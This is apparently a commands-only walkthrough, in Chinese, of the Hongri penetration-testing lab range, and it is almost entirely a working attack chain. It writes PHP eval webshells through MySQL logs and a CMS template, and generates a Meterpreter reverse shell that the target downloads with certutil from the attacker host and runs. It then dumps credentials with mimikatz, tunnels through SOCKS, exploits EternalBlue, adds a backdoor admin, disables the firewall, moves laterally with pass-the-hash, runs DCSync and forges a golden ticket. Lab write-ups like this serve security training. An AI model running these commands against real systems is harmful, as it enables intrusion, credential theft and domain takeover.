# 红日靶场 WP 综合版 纯命令版

> 来源：本地整理的《红日靶场-WP-综合版》。
>
> 只保留可执行命令和必要的输出判断，并为每组命令附一句话说明。

## 1. 外网信息收集

```bash
nmap -sC -sV -p- 192.168.0.110
```

对入口主机执行全端口扫描、服务识别和默认脚本检测。

```bash
dirsearch -u 192.168.0.110 -e * -x 300-399,400-499,500-599
ffuf -u http://192.168.0.110/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

扫描 Web 目录和隐藏路径。

## 2. phpMyAdmin 写马

```sql
SELECT group_concat(user, 0x3a, file_priv) FROM mysql.user;
```

检查数据库用户是否具有 `FILE` 权限。

```sql
SHOW VARIABLES LIKE '%secure_file_priv%';
```

判断是否可以使用 `INTO OUTFILE` 或 `LOAD_FILE`。

```sql
SHOW VARIABLES LIKE '%general%';
```

查看全局日志开关和日志文件路径。

```sql
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = 'C:\\phpStudy\\WWW\\shell.php';
SELECT "<?php eval($_POST['cmd']);?>";
SET GLOBAL general_log_file = 'C:\\phpStudy\\MySQL\\data\\stu1.log';
SET GLOBAL general_log = OFF;
```

开启日志、切换日志到 Web 目录、写入 WebShell、恢复路径并关闭日志。

WebShell 地址和验证请求：

```text
http://192.168.0.110/shell.php
```

```bash
curl -s -X POST "http://192.168.0.110/shell.php" -d "cmd=phpinfo();"
```

通过 HTTP POST 验证 WebShell 是否可执行。

## 3. yxcms 后台 GetShell

```sql
SELECT id, username, password FROM newyxcms.yx_admin;
```

查询 yxcms 管理员账号和密码 Hash。

```bash
python3 -c "import hashlib; md5=lambda s: hashlib.md5(s.encode()).hexdigest(); print(md5(md5('123456')[7:-9]))"
```

验证原文密码 `123456` 经过二次 MD5 和截断后的结果。

后台地址：

```text
http://192.168.0.110/yxcms/index.php?r=admin
```

写入模板的 WebShell：

```php
<?php eval($_POST['cmd']);?>
```

```bash
curl -s -X POST "http://192.168.0.110/yxcms/protected/apps/default/view/default/test.php" -d "cmd=echo 'ok';"
```

验证 yxcms 模板 WebShell 是否可执行。

## 4. MSF 上线 Windows 7

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=5555 -f exe -o /home/kali/shell.exe
```

生成 Meterpreter 反向连接程序。

```text
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
set ExitOnSession false
run -j
```

启动 Handler 并允许同时接收多个会话。

```cmd
certutil -urlcache -split -f http://192.168.0.111/shell.exe C:\phpStudy\WWW\shell.exe
C:\phpStudy\WWW\shell.exe
```

在目标主机下载并执行 Payload。

## 5. Windows 7 后渗透

```text
meterpreter > getuid
meterpreter > setg ConsoleLogging false
```

确认当前身份并关闭控制台日志。

```text
meterpreter > ipconfig
meterpreter > route
meterpreter > run post/windows/gather/enum_domain
meterpreter > run post/windows/gather/enum_logged_on_users
```

收集网卡、路由、域信息和已登录用户。

```text
meterpreter > getsystem
meterpreter > getuid
```

提升到 `NT AUTHORITY\SYSTEM` 并确认权限。

```text
meterpreter > hashdump
```

尝试导出本地用户 Hash。

```text
meterpreter > ps
meterpreter > migrate 492
meterpreter > hashdump
```

如果 `hashdump` 因 32/64 位不匹配失败，迁移到 64 位进程后重试。

```text
meterpreter > load kiwi
meterpreter > creds_all
```

加载 Mimikatz 并枚举明文凭据和 Hash。

```text
meterpreter > shell
C:\> whoami /groups | findstr /i "Domain Admins"
```

确认当前账户是否属于 `Domain Admins`。

## 6. 内网扫描与隧道

```powershell
.\fscan64.exe -h 192.168.52.0/24
```

扫描内网存活主机和服务。

```text
windows_x64_admin.exe -l 6666
```

在攻击机启动代理服务端。

```text
windows_x64_agent.exe -c 192.168.0.111:6666 --reconnect 10
```

在边界主机启动代理客户端并保持重连。

```text
>> use 0
>> socks 7777
```

在代理控制端创建 SOCKS5 代理。

```bash
vim /etc/proxychains4.conf
```

编辑 proxychains 配置。

```text
socks5  127.0.0.1  7777
```

让本地工具通过 7777 端口代理访问内网。

```bash
proxychains4 nmap -Pn -sT -p 88,389,445 192.168.52.138
```

通过代理确认域控的 Kerberos、LDAP 和 SMB 端口。

## 7. MS17-010

```text
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.52.138
set proxies socks5:127.0.0.1:7777
setg reverseAllowProxy true
exploit
```

通过代理对域控执行 EternalBlue payload 模式。

```text
use auxiliary/admin/smb/ms17_010_command
set RHOSTS 192.168.52.138
set COMMAND net user websec admin@123 /add
run
```

在域控创建 `websec` 用户。

```text
set COMMAND net localgroup Administrators websec /add
run
```

把 `websec` 加入本地管理员组。

```text
set COMMAND 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
run
```

开启远程桌面。

```text
set COMMAND netsh firewall set opmode disable
run
```

关闭 Windows 防火墙。

## 8. PsExec 横向

```bash
proxychains4 impacket-psexec GOD/Administrator:'hongrisec@2019'@192.168.52.138
```

使用域管理员明文密码通过 PsExec 获取域控 SYSTEM Shell。

```text
use exploit/windows/smb/psexec
set RHOSTS 192.168.52.138
set SMBUser Administrator
set SMBDomain GOD
set SMBPass aad3b435b51404eeaad3b435b51404ee:794adae2ad271e3a7bba23288c7d4702
set PAYLOAD windows/meterpreter/bind_tcp
run
```

使用 NT Hash 通过 MSF PsExec 模块横向。

## 9. 域控确认与凭据导出

```text
meterpreter > sysinfo
```

确认当前主机的域名、版本和计算机名。

```cmd
net view \\192.168.52.138
```

通过 `NETLOGON` 和 `SYSVOL` 共享判断目标是否为域控。

```text
meterpreter > load kiwi
meterpreter > dcsync_ntlm krbtgt
```

通过 DCSync 获取 `krbtgt` 的 NTLM Hash。

```cmd
ntdsutil "ac i ntds" "ifm" "create full c:\windows\temp\ifm" q q
```

创建 NTDS 数据库的 IFM 备份。

```text
msf6 > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > set SESSION 2
msf6 post(windows/gather/smart_hashdump) > run
```

在域控会话上自动导出域内 Hash。

## 10. 黄金票据

```text
meterpreter > golden_ticket_create -d god.org \
    -s S-1-5-21-2952760202-1353902439-2381784089 \
    -k 58e91a5ac358d86513ab224312314061 \
    -u Administrator -t /tmp/golden.kirbi
```

使用 `krbtgt` Hash 创建黄金票据。

```text
meterpreter > kerberos_ticket_use /tmp/golden.kirbi
meterpreter > shell
C:\> dir \\owa.god.org\c$
```

导入黄金票据并验证域控共享访问。

## 11. 一键命令清单

```bash
nmap -sC -sV -p- 192.168.0.110
dirsearch -u 192.168.0.110 -e * -x 300-399,400-499,500-599
ffuf -u http://192.168.0.110/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

```sql
SELECT group_concat(user, 0x3a, file_priv) FROM mysql.user;
SHOW VARIABLES LIKE '%secure_file_priv%';
SHOW VARIABLES LIKE '%general%';
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = 'C:\\phpStudy\\WWW\\shell.php';
SELECT "<?php eval($_POST['cmd']);?>";
SET GLOBAL general_log_file = 'C:\\phpStudy\\MySQL\\data\\stu1.log';
SET GLOBAL general_log = OFF;
SELECT id, username, password FROM newyxcms.yx_admin;
```

```text
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
set ExitOnSession false
run -j
```

```cmd
certutil -urlcache -split -f http://192.168.0.111/shell.exe C:\phpStudy\WWW\shell.exe
C:\phpStudy\WWW\shell.exe
```

```text
getuid
setg ConsoleLogging false
ipconfig
route
run post/windows/gather/enum_domain
run post/windows/gather/enum_logged_on_users
getsystem
hashdump
ps
migrate 492
load kiwi
creds_all
shell
whoami /groups | findstr /i "Domain Admins"
```

```powershell
.\fscan64.exe -h 192.168.52.0/24
```

```text
windows_x64_admin.exe -l 6666
windows_x64_agent.exe -c 192.168.0.111:6666 --reconnect 10
use 0
socks 7777
```

```text
socks5  127.0.0.1  7777
```

```bash
proxychains4 nmap -Pn -sT -p 88,389,445 192.168.52.138
proxychains4 impacket-psexec GOD/Administrator:'hongrisec@2019'@192.168.52.138
```

```text
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.52.138
set proxies socks5:127.0.0.1:7777
setg reverseAllowProxy true
exploit
```

```text
use auxiliary/admin/smb/ms17_010_command
set RHOSTS 192.168.52.138
set COMMAND net user websec admin@123 /add
run
set COMMAND net localgroup Administrators websec /add
run
set COMMAND 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
run
set COMMAND netsh firewall set opmode disable
run
```

```text
load kiwi
dcsync_ntlm krbtgt
```

```cmd
ntdsutil "ac i ntds" "ifm" "create full c:\windows\temp\ifm" q q
```

```text
use post/windows/gather/smart_hashdump
set SESSION 2
run
```

```text
golden_ticket_create -d god.org -s S-1-5-21-2952760202-1353902439-2381784089 -k 58e91a5ac358d86513ab224312314061 -u Administrator -t /tmp/golden.kirbi
kerberos_ticket_use /tmp/golden.kirbi
shell
dir \\owa.god.org\c$
```